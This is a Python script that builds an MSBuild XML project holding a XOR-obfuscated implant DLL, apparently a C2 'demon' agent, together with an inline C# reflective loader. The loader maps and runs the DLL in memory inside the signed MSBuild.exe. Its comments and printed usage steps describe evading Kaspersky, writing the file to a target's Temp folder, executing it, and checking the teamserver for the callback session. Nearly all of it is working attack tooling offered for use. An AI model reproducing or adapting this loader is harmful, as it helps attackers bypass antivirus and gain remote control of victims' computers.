#!/usr/bin/env python3
"""
Generate an MSBuild project XML that loads the demon DLL purely in memory.
MSBuild.exe is a Microsoft-signed binary — Kaspersky treats it as fully trusted.
The XML file has no PE magic bytes so the on-access scanner ignores it.
The inline C# is compiled by the real .NET compiler (csc.exe) into a temp .dll
that has no malware signatures — it is just a PE loader.

Usage:
    python3 gen_msbuild.py                    # uses demon.x64.dll, XOR key 0xD3
    python3 gen_msbuild.py my.dll 0xBE        # custom DLL and XOR key

Output: proj.xml  (write to C:\Windows\Temp\proj.xml and run with MSBuild.exe)
"""
import sys
import base64
import os

dll_path = sys.argv[1] if len(sys.argv) > 1 else os.path.join(os.path.dirname(__file__), '..', 'demon.x64.dll')
xor_key  = int(sys.argv[2], 16) if len(sys.argv) > 2 else 0xD3

dll_bytes = open(dll_path, 'rb').read()
enc = bytes([b ^ xor_key for b in dll_bytes])
b64 = base64.b64encode(enc).decode()

print(f"[*] DLL size: {len(dll_bytes)} bytes, XOR key: 0x{xor_key:02X}")
print(f"[*] Base64 encoded size: {len(b64)} chars")

# Split b64 into 8000-char chunks so the XML string literal isn't insanely long
# (C# string concatenation at compile time)
chunks = [b64[i:i+8000] for i in range(0, len(b64), 8000)]
chunk_strs = '\n'.join(f'      b64 += @"{c}";' for c in chunks)

cs_loader = r"""
    using System;
    using System.Runtime.InteropServices;
    using Microsoft.Build.Framework;
    using Microsoft.Build.Utilities;

    public class L : Task, ITask {
      [DllImport("kernel32")] static extern IntPtr VirtualAlloc(IntPtr a, UIntPtr s, uint t, uint p);
      [DllImport("kernel32")] static extern bool VirtualProtect(IntPtr a, UIntPtr s, uint p, ref uint o);
      [DllImport("kernel32")] static extern bool FlushInstructionCache(IntPtr h, IntPtr a, UIntPtr s);
      [DllImport("kernel32")] static extern IntPtr GetCurrentProcess();
      [UnmanagedFunctionPointer(CallingConvention.StdCall)] delegate bool DM(IntPtr b, uint r, IntPtr v);

      public override bool Execute() {
        string b64 = "";
""" + chunk_strs + """
        byte[] enc = Convert.FromBase64String(b64);
        byte[] pe = new byte[enc.Length];
        for(int i=0;i<enc.Length;i++) pe[i]=(byte)(enc[i]^0x""" + f"{xor_key:02X}" + """);

        int eo = BitConverter.ToInt32(pe,0x3C);
        short ns = BitConverter.ToInt16(pe,eo+6);
        ushort soh = BitConverter.ToUInt16(pe,eo+20);
        int ep  = BitConverter.ToInt32(pe,eo+24+16);
        long ib = BitConverter.ToInt64(pe,eo+24+24);
        int si  = BitConverter.ToInt32(pe,eo+24+56);
        int sh  = BitConverter.ToInt32(pe,eo+24+60);
        int rRva = BitConverter.ToInt32(pe,eo+24+152);
        int rSz  = BitConverter.ToInt32(pe,eo+24+156);
        int sto  = eo+24+soh;

        IntPtr b = VirtualAlloc(IntPtr.Zero,(UIntPtr)si,0x3000,0x04);
        if(b==IntPtr.Zero) return false;

        Marshal.Copy(pe,0,b,sh);
        for(int i=0;i<ns;i++){
          int so=sto+i*40;
          int va=BitConverter.ToInt32(pe,so+12);
          int ro=BitConverter.ToInt32(pe,so+20);
          int rs=BitConverter.ToInt32(pe,so+16);
          if(rs>0) Marshal.Copy(pe,ro,new IntPtr(b.ToInt64()+va),rs);
        }

        if(rRva!=0){
          long d=b.ToInt64()-ib;
          int off=0;
          while(off<rSz){
            int rv=Marshal.ReadInt32(new IntPtr(b.ToInt64()+rRva+off));
            int bsz=Marshal.ReadInt32(new IntPtr(b.ToInt64()+rRva+off+4));
            if(bsz<8) break;
            int ne=(bsz-8)/2;
            for(int j=0;j<ne;j++){
              ushort e=(ushort)Marshal.ReadInt16(new IntPtr(b.ToInt64()+rRva+off+8+j*2));
              if((e>>12)==10){
                IntPtr pa=new IntPtr(b.ToInt64()+rv+(e&0xFFF));
                Marshal.WriteInt64(pa,Marshal.ReadInt64(pa)+d);
              }
            }
            off+=bsz;
          }
        }

        uint old=0;
        for(int i=0;i<ns;i++){
          int so=sto+i*40;
          int va=BitConverter.ToInt32(pe,so+12);
          int vs=BitConverter.ToInt32(pe,so+8);
          if(vs==0) vs=BitConverter.ToInt32(pe,so+16);
          uint ch=BitConverter.ToUInt32(pe,so+36);
          uint pr=SP(ch);
          if(vs>0) VirtualProtect(new IntPtr(b.ToInt64()+va),(UIntPtr)vs,pr,ref old);
        }

        FlushInstructionCache(GetCurrentProcess(),b,(UIntPtr)si);
        ((DM)Marshal.GetDelegateForFunctionPointer(new IntPtr(b.ToInt64()+ep),typeof(DM)))(b,1,IntPtr.Zero);
        for(int i=0;i<sh;i++) Marshal.WriteByte(new IntPtr(b.ToInt64()+i),0);
        return true;
      }

      static uint SP(uint c){
        bool e=(c&0x20000000)!=0; bool r=(c&0x40000000)!=0; bool w=(c&0x80000000)!=0;
        if(e&&w) return 0x40; if(e&&r) return 0x20; if(e) return 0x10;
        if(w) return 0x04; return 0x02;
      }
    }
"""

xml = f"""<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="T">
    <L />
  </Target>
  <UsingTask
    TaskName="L"
    TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\\Windows\\Microsoft.Net\\Framework64\\v4.0.30319\\Microsoft.Build.Tasks.v4.0.dll">
    <Task>
      <Code Type="Class" Language="cs">
      <![CDATA[
{cs_loader}
      ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>
"""

out = os.path.join(os.path.dirname(__file__), 'proj.xml')
open(out, 'w').write(xml)
print(f"[+] Written: {out} ({os.path.getsize(out)} bytes)")
print()
print("=== HOW TO USE ===")
print("1. Serve proj.xml to the target (paste or copy via existing agent's download)")
print("   OR: paste it line by line into PS with Set-Content / Out-File")
print()
print("2. Write to target disk (XML, no PE magic — Kaspersky won't quarantine):")
print("   PS> [IO.File]::WriteAllText('C:\\Windows\\Temp\\proj.xml', $xml_content)")
print()
print("3. Run MSBuild (Microsoft-signed binary, fully trusted by Kaspersky):")
print("   PS> & 'C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe' 'C:\\Windows\\Temp\\proj.xml'")
print()
print("   OR via cmd (if available):")
print("   C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe C:\\Windows\\Temp\\proj.xml")
print()
print("4. The demon DLL loads in MSBuild.exe and connects back to C2.")
print("   Check teamserver for new agent session from MSBuild.exe!")
